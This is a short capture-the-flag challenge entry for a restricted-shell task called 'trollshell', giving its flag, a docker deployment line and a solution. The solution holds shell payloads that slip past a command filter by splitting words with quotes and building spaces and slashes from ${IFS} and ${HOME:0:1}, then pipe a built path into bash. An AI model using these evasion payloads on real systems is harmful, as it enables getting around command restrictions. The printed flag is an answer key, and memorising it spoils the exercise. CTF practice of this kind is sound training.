# Challenge 2: Restricted Shell
(medium, blackbox)

## Name
trollshell

## Description
I've obtained a shell.. but at what cost?

## Flag
BKSEC{restricted_shells_are_always_fun}

## Deployment
docker compose up


## Solution
```bash
l's'${IFS}-la

c'a't${IFS}flag.txt

e'c'ho${IFS}${HOME:0:1}challenge${HOME:0:1}.xin_flag${IFS}|ba's'h (spam đến baoh ra flag thì thôi)
```
